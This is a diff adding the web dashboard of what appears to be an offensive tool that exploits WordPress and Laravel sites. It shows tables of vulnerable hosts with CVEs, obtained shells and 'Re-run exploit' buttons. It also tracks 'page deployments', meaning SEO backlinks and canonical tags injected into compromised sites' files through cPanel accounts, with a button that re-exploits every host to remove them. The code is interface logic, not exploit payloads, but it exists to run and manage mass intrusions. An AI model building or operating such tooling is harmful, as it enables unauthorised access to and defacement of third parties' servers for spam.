+        rescanEl.style.cssText = 'padding:2px 7px;background:none;border:1px solid #6366f1;color:#6366f1;border-radius:4px;font-size:9px;cursor:pointer';
+        rescanEl.title = `Re-run exploit against ${r.url || r.component}`;
+        rescanEl.onclick = async () => {
+          rescanEl.textContent = '…'; rescanEl.disabled = true;
+          const host = r.url ? new URL(r.url).hostname : r.component;
+          const res = await fetch(`${API}/api/wp-rescan`, {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({host, concurrency: 10}),
+          });
+          const data = await res.json();
+          if (data.ok) {
+            rescanEl.textContent = '✓ started'; rescanEl.style.color = '#16a34a'; rescanEl.style.borderColor = '#16a34a';
+            setTimeout(() => { rescanEl.textContent = '↺ Rescan'; rescanEl.disabled = false; rescanEl.style.color = '#6366f1'; rescanEl.style.borderColor = '#6366f1'; }, 4000);
+          } else {
+            rescanEl.textContent = data.error || 'error'; rescanEl.style.color = '#dc2626'; rescanEl.style.borderColor = '#dc2626';
+            setTimeout(() => { rescanEl.textContent = '↺ Rescan'; rescanEl.disabled = false; rescanEl.style.color = '#6366f1'; rescanEl.style.borderColor = '#6366f1'; }, 3000);
+          }
+        };
+
+        tr.appendChild(cell('td-num', String(i + 1)));
+        tr.appendChild(cell('td-dom', domEl));
+        tr.appendChild(cell('td-src', sevBadge(r.severity)));
+        tr.appendChild(cell('td-key', r.component || '—'));
+        tr.appendChild(cell('td-num', r.version || '—'));
+        tr.appendChild(cell('td-src', r.cve || '—'));
+        tr.appendChild(cell('td-dom', r.title || '—'));
+        tr.appendChild(cell('td-num', r.fixed_in || '—'));
+        tr.appendChild(cell('td-num', verifiedEl));
+        tr.appendChild(cell('td-url', shellEl));
+        tr.appendChild(cell('td-time', (r.detected_at || '').slice(0, 19).replace('T', ' ')));
+        tr.appendChild(cell('td-src', rescanEl));
+        wpBody.appendChild(tr);
+      });
+    } catch(e) {
+      console.error('wp-findings fetch failed', e);
+    }
+  }
+
+  wpRefresh.addEventListener('click', loadWpFindings);
+  wpExport.addEventListener('click', () => { window.location.href = `${API}/api/wp-export`; });
+
+  document.addEventListener('scan-finished', loadWpFindings);
+  loadWpFindings();
+})();
+</script>
+
+<!-- Page Deployment Results -->
+<div class="card" id="backlinkCard" style="display:none">
+  <div class="feed-hd">
+    <div class="feed-title">
+      <span>Page Deployments</span>
+      <span class="hit-badge" id="blBadge">0 found</span>
+    </div>
+    <div style="display:flex;gap:8px;align-items:center">
+      <button class="btn-extract" id="blRefreshBtn">↻ Refresh</button>
+      <button class="btn-extract" id="blExportBtn">⬇ Export CSV</button>
+      <button class="btn-extract" id="blCleanupBtn" style="background:#7f1d1d;border-color:#991b1b;color:#fca5a5" title="Re-exploit CVE on each host and remove all injected content">✕ Remove All Injections</button>
+    </div>
+  </div>
+  <!-- summary banner shown when injections exist -->
+  <div id="blBanner" style="display:none;margin:0 0 12px;padding:12px 14px;background:#052e16;border:2px solid #16a34a;border-radius:6px">
+    <div style="font-size:12px;font-weight:700;color:#16a34a;margin-bottom:4px;letter-spacing:.5px">
+      ✓ PAGES DEPLOYED — <span id="blInjectedCount">0</span> accounts
+    </div>
+    <div style="font-size:10px;color:#86efac;margin-bottom:6px">Canonical tag + contextual link · rotating anchors</div>
+    <div id="blBannerDomains" style="line-height:1.8"></div>
+  </div>
+  <div class="tbl-wrap" style="max-height:380px">
+    <div class="empty" id="blEmpty">
+      <div class="empty-ico">◎</div>
+      <p>No deployments yet. Run a Page Deployment scan to populate this table.</p>
+    </div>
+    <table id="blTable" style="display:none">
+      <thead>
+        <tr>
+          <th class="td-num">#</th>
+          <th>Domain</th>
+          <th>Host</th>
+          <th>cPanel User</th>
+          <th>File</th>
+          <th>Type</th>
+          <th>Anchor</th>
+          <th>Status</th>
+          <th>Injected</th>
+        </tr>
+      </thead>
+      <tbody id="blBody"></tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+(() => {
+  const API = window.API || '';
+  const blCard    = document.getElementById('backlinkCard');
+  const blTable   = document.getElementById('blTable');
+  const blEmpty   = document.getElementById('blEmpty');
+  const blBody    = document.getElementById('blBody');
+  const blBadge   = document.getElementById('blBadge');
+  const blBanner  = document.getElementById('blBanner');
+  const blInjectedCount = document.getElementById('blInjectedCount');
+
+  const STATUS_STYLE = {
+    deployed: 'background:#16a34a;color:#fff;padding:2px 7px;border-radius:10px;font-size:10px;font-weight:700',
+    injected: 'background:#16a34a;color:#fff;padding:2px 7px;border-radius:10px;font-size:10px;font-weight:700',
+    skipped:  'background:#374151;color:#9ca3af;padding:2px 7px;border-radius:10px;font-size:10px',
+    failed:   'background:#dc2626;color:#fff;padding:2px 7px;border-radius:10px;font-size:10px',
+    removed:  'background:#7f1d1d;color:#fca5a5;padding:2px 7px;border-radius:10px;font-size:10px',
+  };
+  const TYPE_STYLE = {
+    wordpress: 'color:#21759b;font-weight:700',
+    php:       'color:#4f5b93;font-weight:700',
+    html:      'color:#f59e0b;font-weight:700',
+  };
+
+  async function loadBlFindings() {
+    try {
+      const rows = await (await fetch(`${API}/api/backlink-findings?limit=2000`)).json();
+      // Always show card if backlink mode is active or there's data
+      const blModeActive = document.getElementById('modeBacklink').checked;
+      if (!rows.length && !blModeActive) { blCard.style.display = 'none'; return; }
+
+      blCard.style.display = '';
+      if (!rows.length) {
+        blTable.style.display = 'none';
+        blEmpty.style.display = '';
+        blBadge.textContent = '0 found';
+        blBanner.style.display = 'none';
+        return;
+      }
+      const injected = rows.filter(r => r.status === 'deployed' || r.status === 'injected');
+      blBadge.textContent = `${rows.length} record(s)`;
+      blInjectedCount.textContent = injected.length;
+      blBanner.style.display = injected.length ? '' : 'none';
+      // Populate injected-domain list in banner
+      const injDomains = [...new Set(injected.map(r => {
+        if (!r.site_url) return null;
+        try { return new URL(r.site_url).hostname; } catch(_) { return r.site_url; }
+      }).filter(Boolean))];
+      const bannerDomainEl = document.getElementById('blBannerDomains');
+      if (bannerDomainEl) {
+        bannerDomainEl.innerHTML = injDomains.map(d =>
+          `<span style="display:inline-block;background:#14532d;border:1px solid #16a34a;border-radius:4px;padding:1px 6px;margin:2px;font-size:10px;color:#86efac">${d}</span>`
+        ).join('');
+      }
+
+      blBody.innerHTML = '';
+      rows.forEach((r, i) => {
+        const d = new Date(r.injected_at);
+        const ts = isNaN(d) ? r.injected_at : d.toLocaleString();
+        let domainLabel = '—', domainHref = null;
+        if (r.site_url) {
+          try {
+            const u = new URL(r.site_url);
+            domainLabel = u.hostname;
+            domainHref = r.site_url;
+          } catch(_) {
+            domainLabel = r.site_url;
+            domainHref = r.site_url.startsWith('http') ? r.site_url : null;
+          }
+        }
+        const domainCell = domainHref
+          ? `<a href="${domainHref}" target="_blank" style="color:var(--accent);font-weight:600">${domainLabel}</a>`
+          : `<span style="color:var(--muted)">${domainLabel}</span>`;
+        const statusBadge = `<span style="${STATUS_STYLE[r.status] || ''}">${r.status}</span>`;
+        const typeSpan = `<span style="${TYPE_STYLE[r.site_type] || 'color:var(--muted)'}">${r.site_type || '?'}</span>`;
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td class="td-num">${i + 1}</td>
+          <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${domainCell}</td>
+          <td>${r.host || '—'}</td>
+          <td style="font-family:monospace;font-size:11px">${r.cpanel_user || '—'}</td>
+          <td style="font-family:monospace;font-size:10px;max-width:160px;overflow:hidden;text-overflow:ellipsis">${r.file_path || '—'}</td>
+          <td>${typeSpan}</td>
+          <td style="max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px">${r.anchor_text || '—'}</td>
+          <td>${statusBadge}</td>
+          <td style="font-size:11px;color:var(--muted)">${ts}</td>`;
+        blBody.appendChild(tr);
+      });
+
+      blTable.style.display = '';
+      blEmpty.style.display = 'none';
+    } catch(e) {
+      console.error('backlink-findings fetch failed', e);
+    }
+  }
+
+  // Show card immediately when backlink mode selected; hide when switching away (if no rows)
+  document.querySelectorAll('input[name="scanMode"]').forEach(r => {
+    r.addEventListener('change', () => {
+      if (r.value === 'backlink' && r.checked) {
+        blCard.style.display = '';
+        loadBlFindings();
+      } else if (r.checked) {
+        loadBlFindings(); // re-evaluate visibility
+      }
+    });
+  });
+
+  document.getElementById('blRefreshBtn').addEventListener('click', loadBlFindings);
+  document.getElementById('blExportBtn').addEventListener('click', () => {
+    window.location.href = `${API}/api/backlink-export`;
+  });
+  document.getElementById('blCleanupBtn').addEventListener('click', async () => {
+    if (!confirm('Re-exploit CVE on all hosts and remove every injected backlink?\nThis cannot be undone.')) return;
+    const btn = document.getElementById('blCleanupBtn');
+    btn.disabled = true;
+    btn.textContent = '⏳ Removing…';
+    try {
+      const resp = await fetch(`${API}/api/start`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({laravel_targets: '_cleanup_', scan_mode: 'cleanup_backlinks'}),
+      });
+      if (resp.ok) {
+        btn.textContent = '✓ Cleanup running…';
+        _startBlPoll();
+      } else {
+        btn.textContent = '✕ Remove All Injections';
+        btn.disabled = false;
+        alert('Failed to start cleanup: ' + resp.status);
+      }
+    } catch(e) {
+      btn.textContent = '✕ Remove All Injections';
+      btn.disabled = false;
+    }
+  });
+
+  // Auto-poll every 5 s so confirmed injections appear live during a scan
+  let _blPollTimer = null;
+  function _startBlPoll() {
+    if (_blPollTimer) return;
+    _blPollTimer = setInterval(loadBlFindings, 5000);
+  }
+  function _stopBlPoll() {
+    if (_blPollTimer) { clearInterval(_blPollTimer); _blPollTimer = null; }
+  }
+
+  document.addEventListener('scan-started', () => {
+    if (document.getElementById('modeBacklink').checked) _startBlPoll();
+  });
+  document.addEventListener('scan-finished', () => { _stopBlPoll(); loadBlFindings(); });
+
+  // Also start polling immediately if backlink mode is already selected
+  if (document.getElementById('modeBacklink').checked) _startBlPoll();
+  document.getElementById('modeBacklink').addEventListener('change', e => {
+    if (e.target.checked) _startBlPoll(); else _stopBlPoll();
+  });
+
+  loadBlFindings();
+})();
+</script>
+</body>
+</html>
